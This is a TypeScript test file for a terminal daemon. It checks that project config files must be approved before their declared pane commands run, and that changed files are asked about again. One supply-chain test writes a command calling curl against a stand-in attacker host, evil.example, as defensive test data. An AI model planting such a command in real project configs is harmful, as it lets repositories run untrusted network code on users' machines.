import { mkdtemp, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { WebSocket } from 'ws';
import {
  PROTOCOL_VERSION,
  controlFrame,
  decodeFrame,
  panes,
  type ControlMessage,
  type ProjectConfigInfo,
} from '@tabterm/shared';
import { initAuth } from './auth.js';
import { DEFAULTS, type Config } from './config.js';
import { Database } from './database.js';
import { LauncherData } from './launcher-data.js';
import { initLog } from './log.js';
import { ProjectIndex } from './project-index.js';
import { ProjectTrust } from './project-trust.js';
import { DaemonServer } from './server.js';
import { SessionManager } from './session-manager.js';
import { WorkspaceStore } from './workspace-store.js';

/**
 * The project config path end to end, over the real socket.
 *
 * The parser is tested separately; what matters here is that the daemon enforces trust itself
 * rather than relying on the page to have asked, and that an approved layout comes out with
 * the panes and commands the file declared.
 */
const PORT = 7995;
const config: Config = { ...DEFAULTS, port: PORT };

let server: DaemonServer;
let sessions: SessionManager;
let workspaces: WorkspaceStore;
let trust: ProjectTrust;
let token: string;

beforeAll(async () => {
  initLog('error');
  token = initAuth();
  sessions = new SessionManager(config, { onExit: () => {}, onStateChange: () => {} });
  workspaces = new WorkspaceStore();
  trust = new ProjectTrust(new Database(':memory:'));
  server = new DaemonServer(
    config,
    sessions,
    workspaces,
    new LauncherData(new Database(':memory:')),
    trust,
    new ProjectIndex(),
  );
  await server.listen();
});

afterAll(async () => {
  await server.close();
  await sessions.shutdown();
});

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

class Client {
  readonly seen: ControlMessage[] = [];
  private constructor(readonly ws: WebSocket) {
    ws.on('message', (raw: Buffer) => {
      const frame = decodeFrame(new Uint8Array(raw));
      if (frame.kind === 'control') this.seen.push(frame.message);
    });
  }
  static async connect(): Promise<Client> {
    const ws = new WebSocket(`ws://127.0.0.1:${PORT}`);
    await new Promise((r, j) => {
      ws.on('open', r);
      ws.on('error', j);
    });
    const c = new Client(ws);
    ws.send(controlFrame({ t: 'auth', v: PROTOCOL_VERSION, role: 'data', token, clientId: 'pp' }));
    await c.waitFor('auth-ok');
    c.seen.length = 0;
    return c;
  }
  send(m: ControlMessage): void {
    this.ws.send(controlFrame(m));
  }
  async waitFor(t: string, ms = 4000): Promise<ControlMessage> {
    const deadline = Date.now() + ms;
    for (;;) {
      const hit = this.seen.find((m) => m.t === t);
      if (hit) return hit;
      if (Date.now() > deadline) throw new Error(`timed out waiting for ${t}`);
      await sleep(15);
    }
  }
  close(): void {
    this.ws.close();
  }
}

async function project(config_: unknown): Promise<string> {
  const dir = await mkdtemp(join(tmpdir(), 'tabterm-proj-'));
  await writeFile(join(dir, '.tabterm.json'), JSON.stringify(config_));
  return dir;
}

const inspect = async (c: Client, cwd: string): Promise<ProjectConfigInfo | null> => {
  c.seen.length = 0;
  c.send({ t: 'inspect-project', cwd });
  const msg = (await c.waitFor('project-config')) as unknown as {
    config: ProjectConfigInfo | null;
  };
  return msg.config;
};

describe('project config over the protocol', () => {
  it('reports a config and asks about it the first time', async () => {
    const dir = await project({
      name: 'Two up',
      layout: {
        direction: 'horizontal',
        children: [{ terminal: { command: ['echo', 'left'] } }, { terminal: {} }],
      },
    });
    const c = await Client.connect();
    const info = await inspect(c, dir);
    expect(info?.action).toBe('ask');
    expect(info?.paneCount).toBe(2);
    // Shown verbatim, so the prompt cannot describe one thing and run another.
    expect(info?.commands[0]).toEqual(['echo', 'left']);
    c.close();
  });

  it('reports nothing for a directory with no config', async () => {
    const c = await Client.connect();
    expect(await inspect(c, await mkdtemp(join(tmpdir(), 'tabterm-bare-')))).toBeNull();
    c.close();
  });

  it('refuses to launch a config nobody approved, even when asked directly', async () => {
    // The page could always send this message on its own. The daemon must not take its word
    // for it that a prompt was ever shown.
    const dir = await project({ layout: { terminal: { command: ['true'] } } });
    const c = await Client.connect();
    c.send({ t: 'launch-project-template', cwd: dir, cols: 80, rows: 24 });
    const err = (await c.waitFor('error')) as unknown as { code: string };
    expect(err.code).toBe('not-trusted');
    c.close();
  });

  it('builds the declared layout once it is approved', async () => {
    const dir = await project({
      name: 'Three',
      layout: {
        direction: 'horizontal',
        ratio: 0.5,
        children: [
          { terminal: {} },
          { direction: 'vertical', children: [{ terminal: {} }, { terminal: {} }] },
        ],
      },
    });
    const c = await Client.connect();
    const info = await inspect(c, dir);
    c.send({
      t: 'decide-project-trust',
      path: info?.path ?? '',
      contentHash: info?.contentHash ?? '',
      decision: 'trusted',
    });
    await sleep(50);
    expect((await inspect(c, dir))?.action).toBe('offer');

    c.send({ t: 'launch-project-template', cwd: dir, cols: 80, rows: 24 });
    const created = (await c.waitFor('session-created')) as unknown as { workspaceId: string };
    const ws = workspaces.get(created.workspaceId);
    expect(ws).toBeDefined();
    expect(panes(ws?.layout ?? { type: 'terminal', paneId: 'x', sessionId: 'y' })).toHaveLength(3);
    c.close();
  });

  it('asks again after the file changes under an approval', async () => {
    const dir = await project({ name: 'v1', layout: { terminal: { command: ['echo', 'one'] } } });
    const c = await Client.connect();
    const first = await inspect(c, dir);
    c.send({
      t: 'decide-project-trust',
      path: first?.path ?? '',
      contentHash: first?.contentHash ?? '',
      decision: 'trusted',
    });
    await sleep(50);
    expect((await inspect(c, dir))?.action).toBe('offer');

    // The supply-chain case, end to end: the repository rewrites what it runs.
    await writeFile(
      join(dir, '.tabterm.json'),
      JSON.stringify({ name: 'v2', layout: { terminal: { command: ['curl', 'evil.example'] } } }),
    );
    const second = await inspect(c, dir);
    expect(second?.action).toBe('ask');
    expect(second?.changedSince).toBe('trusted');

    // And the daemon refuses to run it while it is unapproved.
    c.seen.length = 0;
    c.send({ t: 'launch-project-template', cwd: dir, cols: 80, rows: 24 });
    expect(((await c.waitFor('error')) as unknown as { code: string }).code).toBe('not-trusted');
    c.close();
  });

  it('keeps a pane whose declared command finished, along with its output', async () => {
    // The command is the reason the pane exists. Closing it the moment the command exits would
    // discard the output someone opened the workspace to read.
    const dir = await project({
      name: 'One shot',
      layout: { terminal: { command: ['echo', 'DECLARED-OUTPUT'] } },
    });
    const c = await Client.connect();
    const info = await inspect(c, dir);
    c.send({
      t: 'decide-project-trust',
      path: info?.path ?? '',
      contentHash: info?.contentHash ?? '',
      decision: 'trusted',
    });
    await sleep(50);
    c.send({ t: 'launch-project-template', cwd: dir, cols: 80, rows: 24 });
    const created = (await c.waitFor('session-created')) as unknown as {
      workspaceId: string;
      sessionId: string;
    };

    // Long enough for echo to run and exit.
    await sleep(900);
    const ws = workspaces.get(created.workspaceId);
    expect(panes(ws?.layout ?? { type: 'terminal', paneId: 'x', sessionId: 'y' })).toHaveLength(1);

    const session = sessions.get(created.sessionId);
    expect(session).toBeDefined();
    const screen = session?.vt.snapshot(0).screen ?? '';
    expect(screen).toContain('DECLARED-OUTPUT');
    // And it says so plainly, rather than leaving a dead pane with no explanation.
    expect(screen).toContain('finished');
    c.close();
  });

  it('stays quiet about a config it was told to ignore', async () => {
    const dir = await project({ name: 'no thanks' });
    const c = await Client.connect();
    const info = await inspect(c, dir);
    c.send({
      t: 'decide-project-trust',
      path: info?.path ?? '',
      contentHash: info?.contentHash ?? '',
      decision: 'denied',
    });
    await sleep(50);
    expect((await inspect(c, dir))?.action).toBe('ignore');
    c.close();
  });
});
